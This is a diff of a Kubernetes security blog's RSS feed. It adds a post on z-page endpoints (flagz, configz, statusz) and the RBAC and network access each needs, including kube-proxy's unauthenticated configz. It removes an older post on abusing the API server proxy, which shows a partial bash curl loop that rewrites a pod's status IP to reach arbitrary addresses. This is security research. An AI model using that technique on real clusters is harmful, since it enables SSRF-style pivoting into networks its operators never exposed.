@@ -7,6 +7,118 @@
 		<atom:link href="https://raesene.github.io/feed.xml" rel="self" type="application/rss+xml" />
 		
 			<item>
+				<title>Show us Zee Pages</title>
+				<description>&lt;p&gt;Full disclosure, this is one of those posts I do where there’s no dramatic pay off at the end, it’s just documenting something I found that took me a while to figure out and that I thought was interesting :)&lt;/p&gt;
+
+&lt;p&gt;Understanding the running state of a Kubernetes cluster and its various components, has always been a bit of a tricky affair, with many configuration files and command line flags that need to be read and orders of precedence understood to get the final state. It’s a topic that I’ve had a particular interest in, as I help maintain the &lt;a href=&quot;https://www.cisecurity.org/benchmark/kubernetes&quot;&gt;CIS benchmark for Kubernetes&lt;/a&gt;, and part of that is explaining how to check cluster state in the interest of security hardening. Explaining the different options of where configuration can be loaded from is a bit tricky, so any option for deriving that information easily would be very welcome!&lt;/p&gt;
+
+&lt;p&gt;A relatively recent development in this space is the official addition of &lt;a href=&quot;https://kubernetes.io/docs/reference/instrumentation/zpages/&quot;&gt;z-pages&lt;/a&gt; to various Kubernetes components (although as we see there are some longer standing less official ones too). These are endpoints intended for cluster administrators to use for debugging and maintaining their cluster, which sounds ideal. However the reality is unfortunately a little more complex.&lt;/p&gt;
+
+&lt;h2 id=&quot;the-different-types-of-z-pages&quot;&gt;The different types of z-pages&lt;/h2&gt;
+
+&lt;p&gt;Looking at the &lt;a href=&quot;https://kubernetes.io/docs/reference/instrumentation/zpages/&quot;&gt;documentation on the Kubernetes website&lt;/a&gt;, you’ll see mention of two main z-pages, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;statusz&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flagz&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;statusz&lt;/code&gt; is fairly straightforward, it returns the status of the component. As an example, you can see that endpoint on the kube-apiserver component with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl get --raw /statusz&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apiserver statusz
+Warning: This endpoint is not meant to be machine parseable, has no formatting compatibility guarantees and is &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;debugging purposes only.
+
+Started:  Mon Jul 20 06:14:02 UTC 2026
+Up:  3 hr 22 min 42 sec
+Go version:  go1.26.2
+Binary version:  1.36.1
+Emulation version:  1.36
+Paths:  /flagz /healthz /livez /metrics /readyz /statusz /version
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;One of the handy points there is it shows us which other resources available, with some newer ones like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flagz&lt;/code&gt; and others which have been around a long time like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;version&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Things get a little more complex if you look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;statusz&lt;/code&gt; from another Kubernetes component like the kubelet. The first problem (depending on version and distribution) is you might not be able to get that endpoint via the Kubernetes API proxy, and the second is when you do get the information by directly querying the kubelet API, there’s a new endpoint &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;configz&lt;/code&gt;!&lt;/p&gt;
+
+&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;kind&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Statusz&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;apiVersion&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;config.k8s.io/v1beta1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;metadata&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;kubelet&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;startTime&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;2026-07-20T06:14:01Z&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;uptimeSeconds&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16625&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;goVersion&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;go1.26.2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;binaryVersion&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.36.1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;emulationVersion&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.36&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;paths&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/configz&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/debug&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/flagz&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/healthz&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/metrics&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;To get a full picture, after going round the core components, we can see that the set of available z-page endpoints varies depending on the service.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;kube-apiserver&lt;/strong&gt; - /flagz, /healthz, /livez, /metrics, /readyz, /statusz, /version&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;kube-controller-manager&lt;/strong&gt; - /configz, /flagz, /healthz, /metrics&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;kube-scheduler&lt;/strong&gt; - /configz, /flagz, /healthz, /livez, /metrics, /readyz&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;kube-proxy&lt;/strong&gt; - /configz, /flagz, /healthz, /metrics, /proxyMode&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;kubelet&lt;/strong&gt; - /configz, /debug, /flagz, /healthz, /metrics&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;For the purposes of our original goal, the two important ones here are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flagz&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;configz&lt;/code&gt; as they serve subtly different but similar purposes.&lt;/p&gt;
+
+&lt;h2 id=&quot;comparing-flagz-and-configz&quot;&gt;Comparing flagz and configz&lt;/h2&gt;
+
+&lt;p&gt;From this &lt;a href=&quot;https://kubernetes.io/blog/2025/12/31/kubernetes-v1-35-structured-zpages/&quot;&gt;blog article about z-pages&lt;/a&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flagz&lt;/code&gt; “Shows all command-line arguments and their values used to start the component (with confidential values redacted for security)”. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;configz&lt;/code&gt; doesn’t have an official definition AFAIK (it was not introduced in the general z-pages feature, it’s been around since ~2016, as mentioned in &lt;a href=&quot;https://github.com/kubernetes/kubernetes/pull/20528/changes&quot;&gt;this PR&lt;/a&gt;) and its never been got to fully released as a feature, but in general it’s designed to show the configuration of the component including parameters loaded from configuration files.&lt;/p&gt;
+
+&lt;p&gt;So… why does this difference matter? Well, if you’re trying to debug or audit a cluster, and you’re interested in the actual running configuration of a component, and getting that exact information can be a bit tricky.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;If&lt;/em&gt; the component is configured purely with command line flags, then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flagz&lt;/code&gt; will work just fine, however if there are any configuration files involved (and there very commonly are), then things get more interesting as we have multiple sources of configuration and also the option of default settings (if no explicit configuration is provided). At that point relying on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flagz&lt;/code&gt; is a bad idea as it will return incomplete or downright inaccurate information.&lt;/p&gt;
+
+&lt;p&gt;Looking at a practical example of how configuration is derived, let’s take the kubelet :-&lt;/p&gt;
+
+&lt;p&gt;From the &lt;a href=&quot;https://kubernetes.io/docs/tasks/administer-cluster/kubelet-config-file/#kubelet-configuration-merging-order&quot;&gt;order of precedence for Kubelet flags&lt;/a&gt; an actively set command line flag will overwrite a value from the config file, so that’s the highest priority.&lt;/p&gt;
+
+&lt;p&gt;Next if no command line parameter is provided and a config file is in use which specifies the parameter, that wins.&lt;/p&gt;
+
+&lt;p&gt;Then if a config file is provided but doesn’t specify the explicit parameter, the default from the config file setup wins.&lt;/p&gt;
+
+&lt;p&gt;Finally if there is no config file at all and no explicit CLI flag, the default from the CLI flags takes effect.&lt;/p&gt;
+
+&lt;p&gt;One thing that is important here is that the defaults specified in the configuration file specification are sometimes &lt;em&gt;different&lt;/em&gt; from the default specified for command-line flags. For example, the kubelet’s read only port defaults to enabled (10255/TCP) based on the CLI flags default and disabled (0) based on the config file default.&lt;/p&gt;
+
+&lt;h2 id=&quot;authentication-and-authorization-for-configz&quot;&gt;Authentication and Authorization for configz&lt;/h2&gt;
+
+&lt;p&gt;Given what we’ve just discussed, in most cases you’ll want to rely on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;configz&lt;/code&gt; for information, as it’s more complete than &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flagz&lt;/code&gt;. However that leads to our first problem which is kube-apiserver doesn’t currently support &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;configz&lt;/code&gt; :(&lt;/p&gt;
+
+&lt;p&gt;For the components it does support (kube-scheduler, kube-controller-manager, kube-proxy and the kubelet) we’ll need to be able to authenticate to the service and have the appropriate authorization to get to the endpoint. There is an in-built clusterrole called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:monitoring&lt;/code&gt; that provides access to most of the z-pages buuuuut not &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;configz&lt;/code&gt; :)&lt;/p&gt;
+
+&lt;p&gt;So for kube-scheduler and kube-controller-manager we need a clusterrole and clusterrolebinding that allow access to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/configz&lt;/code&gt; NonResourceURL, and we’ll need network access to the localhost interface of the control plane node as those components only listen on that interface. Then for the kubelet, we’ll need get rights to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;node/configz&lt;/code&gt; if fine grained Kubelet authorization is supported or, on older versions, get rights to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;node/proxy&lt;/code&gt; (N.B. that permission is &lt;a href=&quot;https://grahamhelton.com/blog/nodes-proxy-rce&quot;&gt;quite powerful&lt;/a&gt;, so be careful).&lt;/p&gt;
+
+&lt;p&gt;Lastly there’s the kube-proxy and interestingly this one doesn’t need any credentials at all as the kube-proxy component doesn’t support authentication. In &lt;em&gt;most&lt;/em&gt; cases you’ll need network access to the localhost interface of the worker node to get to that endpoint, but at least one distribution (AWS EKS) binds it to all interfaces so you can get to that from anywhere on the container network.&lt;/p&gt;
+
+&lt;h2 id=&quot;dealing-with-gaps-in-the-information-returned-from-configz&quot;&gt;Dealing with gaps in the information returned from configz&lt;/h2&gt;
+
+&lt;p&gt;Once you’ve got your information, you might note that it doesn’t cover every single supported parameter. This is because &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;configz&lt;/code&gt; will not always report a value where the default is in use. So you can either make the assumption that if it’s not returned then the &lt;strong&gt;config file default&lt;/strong&gt; (as opposed to the CLI default) applies, or you can add some logic that fills in the gaps.&lt;/p&gt;
+
+&lt;h2 id=&quot;zeedumper&quot;&gt;zeedumper&lt;/h2&gt;
+
+&lt;p&gt;To save some time for people doing this manually I’ve got a little utility called &lt;a href=&quot;https://github.com/raesene/zeedumper/&quot;&gt;zeedumper&lt;/a&gt; that I’ve been workin on, which can drop out the information from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flagz&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;statusz&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;configz&lt;/code&gt; from each component. N.B. This isn’t anywhere near a v1 and it does create a pod and some rights in the cluster, so don’t run it in production without testing first :)&lt;/p&gt;
+
+&lt;p&gt;zeedumper will try and fill in the missing default information for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;configz&lt;/code&gt; to give a complete picture for the kubelet and kube-proxy components (kube-scheduler and kube-controller-manager still to come)&lt;/p&gt;
+
+&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;While z-pages are quite a useful idea for cluster troubleshooting and configuration review, there’s unfortunately quite a lot of details to keep in mind and pitfalls to be aware of. I hope that as time goes on the picture will get simpler and we’ll get a unified cluster configuration endpoint as it’ll make a variety of cluster administration tasks quite a lot easier.&lt;/p&gt;
+
+</description>
+				<pubDate>Mon, 20 Jul 2026 14:00:00 +0100</pubDate>
+				<link>https://raesene.github.io/blog/2026/07/20/show-us-zee-pages/</link>
+				<guid isPermaLink="true">https://raesene.github.io/blog/2026/07/20/show-us-zee-pages/</guid>
+			</item>
+		
+			<item>
 				<title>Do containers still contain?</title>
 				<description>&lt;p&gt;The questions of whether containers really contain has been an active topic of debate since pretty much as long as containers have been in use and the answer, like most things in security, is it depends! Security isn’t an absolute but calculations do change with new threats and tools and I think that that kind of change is happening at the moment with regards to Docker style containers and how much you can rely on their isolation.&lt;/p&gt;
 
@@ -555,213 +667,6 @@ Blocked Syscalls &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;54&lt;span class=
 				<pubDate>Fri, 14 Mar 2025 10:00:00 +0000</pubDate>
 				<link>https://raesene.github.io/blog/2025/03/14/cve-2025-1767-another-gitrepo-issue/</link>
 				<guid isPermaLink="true">https://raesene.github.io/blog/2025/03/14/cve-2025-1767-another-gitrepo-issue/</guid>
-			</item>
-		
-			<item>
-				<title>Exploring the Kubernetes API Server Proxy</title>
-				<description>&lt;p&gt;For my first post of the year I thought it’d be interesting to look at a lesser known feature of the Kubernetes API server which has some interesting security implications.&lt;/p&gt;
-
-&lt;p&gt;The Kubernetes API server can act as an HTTP proxy server, allowing users with the right access to get to applications they might otherwise not be able to reach. This is one of a number of proxies in the Kubernetes world (detailed &lt;a href=&quot;https://kubernetes.io/docs/concepts/cluster-administration/proxies/&quot;&gt;here&lt;/a&gt;) which serve different purposes. The proxy can be used to access pods, services, and nodes in the cluster, we’ll focus on pods and nodes for this post.&lt;/p&gt;
-
-&lt;h2 id=&quot;how-does-it-work&quot;&gt;How does it work?&lt;/h2&gt;
-
-&lt;p&gt;Let’s demonstrate how this works with a &lt;a href=&quot;https://kind.sigs.k8s.io/&quot;&gt;KinD&lt;/a&gt; cluster and some pods. With a standard kind cluster spun up using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kind create cluster&lt;/code&gt; we can start an echo server so it’ll show us what we’re sending&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kubectl run echoserver &lt;span class=&quot;nt&quot;&gt;--image&lt;/span&gt; gcr.io/google_containers/echoserver:1.10
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Next (just to make things a bit more complex) we’ll start the &lt;a href=&quot;https://kubernetes.io/docs/tasks/access-application-cluster/access-cluster/#directly-accessing-the-rest-api&quot;&gt;kubectl proxy&lt;/a&gt; on our client to let us send curl requests to the API server more easily&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kubectl proxy
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;With that all in place we can use a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt; request from our client to access the echoserver pod via the API server proxy&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl http://127.0.0.1:8001/api/v1/namespaces/default/pods/echoserver:8080/proxy/
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;And you should get a response that looks a bit like this&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Request Information:
-        client_address=10.244.0.1
-        method=GET
-        real path=/
-        query=
-        request_version=1.1
-        request_scheme=http
-        request_uri=http://127.0.0.1:8080/
-
-Request Headers:
-        accept=*/*
-        accept-encoding=gzip
-        host=127.0.0.1:45745
-        user-agent=curl/8.5.0
-        x-forwarded-for=127.0.0.1, 172.18.0.1
-        x-forwarded-uri=/api/v1/namespaces/default/pods/echoserver:8080/proxy/
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Looking at the response from the echo server we can see some interesting items. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;client_address&lt;/code&gt; is the API servers address on the pod network, and we can also see the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x-forwarded-for&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x-forwarded-uri&lt;/code&gt; headers are set too.&lt;/p&gt;
-
-&lt;p&gt;Graphically the set of connections look a bit like this&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raesene.github.io/assets/media/kube-api-proxy.png&quot; alt=&quot;API Server Proxy&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;In terms of how this feature works, one interesting point to note here is that it’s possible to specify the port that we’re using, so the API server proxy can be used to get to any port.&lt;/p&gt;
-
-&lt;p&gt;We can also put in anything that works in a curl request and it will be relayed onwards to the proxy targets, so POST requests, headers with tokens or anything else that’s valid in curl, which makes this pretty powerful.&lt;/p&gt;
-
-&lt;p&gt;It’s not just pods that we can proxy to, we can also get to any service running on a node (with an exception we’ll mention in a bit). So for example with our kind cluster setup, we can issue a curl command like&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl http://127.0.0.1:8001/api/v1/nodes/http:kind-control-plane:10256/proxy/healthz
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;and we get back the kube-proxy’s healthz endpoint information&lt;/p&gt;
-
-&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;lastUpdated&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;2025-01-18 07:58:53.413049689 +0000 UTC m=+930.365308647&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;currentTime&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;2025-01-18 07:58:53.413049689 +0000 UTC m=+930.365308647&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;nodeEligible&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;security-controls&quot;&gt;Security Controls&lt;/h2&gt;
-
-&lt;p&gt;Obviously this is a fairly powerful feature and not something you’d want to give to just anyone, so what rights do you need and what restrictions are there on its use?&lt;/p&gt;
-
-&lt;p&gt;The user making use of the proxy requires rights to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;proxy&lt;/code&gt; sub-resource of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pods&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nodes&lt;/code&gt; (N.B. Providing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;node/proxy&lt;/code&gt; rights also allows use of the Kubelet APIs more dangerous features).&lt;/p&gt;
-
-&lt;p&gt;Additionally there is a check in the API server source code which looks to stop users of this feature from reaching localhost or link-local (e.g. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;169.254.169.254&lt;/code&gt;) addresses. The function &lt;a href=&quot;https://github.com/kubernetes/kubernetes/blob/master/pkg/registry/core/node/strategy.go#L272&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;isProxyableHost&lt;/code&gt;&lt;/a&gt; uses the golang function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;isGlobalUnicast&lt;/code&gt; to check if it’s ok to proxy the requests.&lt;/p&gt;
-
-&lt;h2 id=&quot;bypasses-and-limitations&quot;&gt;Bypasses and limitations&lt;/h2&gt;
-
-&lt;p&gt;Now we’ve described a bit about how this feature is used and secured, let’s get on to the fun part, how can it be (mis)used :)&lt;/p&gt;
-
-&lt;p&gt;Obviously a server service that lets us proxy requests, is effectively SSRF by design, so it seems likely that there’s are some interesting ways we can use it.&lt;/p&gt;
-
-&lt;h3 id=&quot;proxying-to-addresses-outside-the-cluster&quot;&gt;Proxying to addresses outside the cluster&lt;/h3&gt;
-
-&lt;p&gt;One thing that might be handy if you’re a pentester or perhaps CTF player is being able to use the API server’s network position to get access to other hosts on restricted networks. To do that we’d need to be able to tell the API server proxy to direct traffic to arbitrary IP addresses rather than just pods and nodes inside the cluster.&lt;/p&gt;
-
-&lt;p&gt;For this we’ll go to a Kinvolk &lt;a href=&quot;https://kinvolk.io/blog/2019/02/abusing-kubernetes-apiserver-proxying&quot;&gt;blog post from 2019&lt;/a&gt;, as this technique works fine in 2025!&lt;/p&gt;
-
-&lt;p&gt;Essentially, if you own a pod resource you can overwrite the IP address that it has in its status and then proxy to that IP address. It’s a little tricky as the Kubernetes cluster will spot this change as a mistake and will change it back to the valid IP address, so you have to loop the requests to keep it set to the value you want.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
-
-&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-euo&lt;/span&gt; pipefail
-
-&lt;span class=&quot;nb&quot;&gt;readonly &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;8001
-&lt;span class=&quot;nb&quot;&gt;readonly &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;POD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;echoserver
-&lt;span class=&quot;nb&quot;&gt;readonly &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;TARGETIP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1.1.1.1
-
-&lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
-  &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;Content-Type: application/json&apos;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
-    &lt;span class=&quot;s2&quot;&gt;&quot;http://localhost:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/api/v1/namespaces/default/pods/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;POD&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/status&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;POD&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;-orig.json&quot;&lt;/span&gt;
-
